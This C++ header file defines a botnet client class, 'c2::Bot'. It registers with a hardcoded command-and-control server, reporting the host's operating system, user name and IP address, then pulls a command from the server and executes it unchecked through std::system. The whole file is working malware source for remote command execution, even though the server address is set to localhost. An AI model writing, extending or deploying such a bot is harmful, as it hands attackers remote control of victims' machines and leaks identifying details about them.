#ifndef C2_HH
#define C2_HH

#include <string>
#include <cstdlib>

#include "request.hh"

const std::string C2_SERVER = "http://localhost:41450";
const std::string REGISTER_URI = "/convey/register/";
const std::string CMD_URI = "/convey/cmd/";
const std::string HASH_TYPE = "sha256sum";

namespace c2 {

class Bot {
    public:
        std::string hashSum, os, user, ipAddr;

        void registerBot()
        {
            std::string postForm = _getRegParams();
            std::string requestUri = C2_SERVER + REGISTER_URI;
            request::post(requestUri, postForm);
        }

        void executeOrder () {
            std::string postForm = _getCmdParams();
            std::string requestUri = C2_SERVER + CMD_URI;
            std::string cmd= request::post(requestUri, postForm);

            std::system(cmd.c_str());
        }

    private:
        std::string _getRegParams ()
        {
            std::string postForm =
                "hash_type=" + HASH_TYPE
                + "&hash_sum=" + hashSum
                + "&operating_sys=" + os
                + "&user=" + user
                + "&ip_addr=" + ipAddr;

            return postForm;
        }


        std::string _getCmdParams ()
        {
            std::string postForm =
                "hash_sum=" + hashSum
                + "&ip_addr=" + ipAddr;

            return postForm;
        }
};


} //namespace c2

#endif // C2_HH
